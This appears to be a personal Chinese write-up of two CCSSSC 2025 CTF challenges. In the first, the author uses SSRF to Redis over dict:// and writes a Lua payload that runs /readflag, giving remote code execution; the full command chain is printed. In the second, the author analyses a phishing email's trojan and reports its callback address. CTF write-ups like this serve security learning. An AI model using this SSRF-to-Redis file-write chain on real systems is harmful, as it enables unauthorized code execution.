---
title: "CCSSSC2025"
date: 2025-01-05
draft: false
description: "软件安全攻防赛 2025"
summary: "软件安全攻防赛 2025 个人WriteUP"
tags: ["writeup", "ctf"]
categories: ["writeup"]
---

## WEB

### CachedVisitor

[题目附件](/attachments/ccsssc2025/fishingemail_25da885af63965bf249067b64099c319attachment_20250102090654845.zip)

部分有用的测试：

![可出网证明](/img/posts/ccsssc2025/CachedVisitor-1.png)

![文件读取证明](/img/posts/ccsssc2025/CachedVisitor-2.png)

![dict协议可用证明](/img/posts/ccsssc2025/CachedVisitor-3.png)

容器出网且可读取文件

dict协议可用，可访问redis

分析了一下源代码

```main.lua```从```visit.script```中读取```\##LUA_START##```和```##LUA_END##```之间的内容作为脚本运行

```dockerfile
COPY flag /flag
COPY readflag /readflag
RUN chmod 400 /flag
RUN chmod +xs /readflag
```

flag设置了权限无法直接读取

尝试使用redis写visit.script进行RCE

在本地docker编写lua测试可以输出flag

```lua
##LUA_START##ngx.say(io.popen('/readflag'):read('*all'))##LUA_END##
```

直接使用redis将lua写入visit.script

```
dict://127.0.0.1:6379/set:payload:"##LUA_START##ngx.say(io.popen('/readflag'):read('*all'))##LUA_END##"
dict://127.0.0.1:6379/config:set:dir:/scripts/
dict://127.0.0.1:6379/config:set:dbfilename:visit.script
dict://127.0.0.1:6379/bgsave
```

写入之后随意发送一个请求即可执行我们写入的脚本

> ```dart{dc2e4048-dca7-4fa3-9803-8ee9d785af2b}```

## Misc

### Fishing E-mail

> Bob收到了一份钓鱼邮件，请找出木马的回连地址和端口。 假如回连地址和端口为123.213.123.123:1234，那么敏感信息为MD5(123.213.123.123:1234)，即d9bdd0390849615555d1f75fa854b14f，以Cyberchef的结果为准。

[题目附件](/attachments/ccsssc2025/CachedVisitor.zip)

```yaml
Content-Transfer-Encoding: base64
```

发现编码格式是Base64，我们直接解码查看内容

```
今天是你的24岁生日，祝你生日快乐

<div class="qmbox"><p style="font-family: -apple-system, BlinkMacSystemFont, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-size: 10.5pt; color: rgb(46, 48, 51);">今天是你的24岁生日，祝你生日快乐</p><div xmail-signature=""><xm-signature></xm-signature><p></p></div></div>

生日礼物.zip(BIN)
```

丢CyberChef提取zip发现有密码

```
Date: Mon, 11 Nov 2024 12:54:24 +0800
```

根据生日推测密码```20001111```

成功解压得到exe

在虚拟机中运行后抓包得到反连地址

![抓包结果](/img/posts/ccsssc2025/Fishing_E-mail.png)

> MD5(222.218.218.218:55555)
>
> df3101212c55ea8c417ad799cfc6b509
